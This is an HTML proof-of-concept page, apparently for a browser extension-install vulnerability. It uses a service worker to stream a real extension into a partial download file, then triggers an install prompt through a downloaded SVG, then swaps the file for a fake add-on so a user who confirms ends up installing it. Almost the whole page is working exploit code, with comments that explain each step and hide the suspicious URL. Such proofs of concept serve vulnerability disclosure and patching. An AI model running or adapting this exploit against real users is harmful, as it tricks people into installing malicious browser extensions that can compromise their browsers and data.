<head>
    <title>proof of concept</title>
</head>
<body>
wait...
<script>
const sw = navigator.serviceWorker || alert('error: need service worker API (use HTTPS or localhost)');
const filename = `addon-${Math.random()}.xpi`;
const svg = new Blob([`
<svg xmlns="http://www.w3.org/2000/svg">
    <title>install</title>
    <script>
        // Relocate so the URL looks less suspicios
        location.href = 'about:blank'
        InstallTrigger.install([{URL: "${filename}.part"}])
    <\/script>
</svg>`], {type: 'image/svg+xml'});

function sleep(sec) {
    return new Promise(resolve => setTimeout(resolve, sec*1000));
}

function waitForMessage(data) {
    return new Promise((resolve) => {
        sw.addEventListener('message', function handler(event) {
            if (event.data !== data)
                return;
            sw.removeEventListener('message', handler);
            resolve(event);
        });
    });
}

function download(path, name = '') {
    const link = document.createElement('a');
    link.href = path;
    link.download = name;
    link.click()
}

async function go() {
    let registration = await sw.getRegistration();
    if (registration)
        await registration.unregister();
    registration = await sw.register('/sw.js');
    await sw.ready;

    // Start extension download. This creates a `.part` file in the download dir
    download(`/${filename}?fetch=real.xpi&control`)
    // Wait until `.part` file contains entire extension
    await waitForMessage('stream.sent');
    // Download helper SVG which auto-opens and prompts to install the `.part` file as extension
    download(URL.createObjectURL(svg), 'installer.svg')
    // Allow some time for install prompt to pop up. Increase as necessary
    await sleep(1);
    // Close stream, so the download completes and `.part` file disappears
    registration.active.postMessage('stream.close');
    // Download fake extension in place of previous `.part` file
    download(`/${filename}.part?fetch=fake.xpi`)
    // If the user now confirms the dialog, they are installing the fake addon
}
go();
</script>
</body>
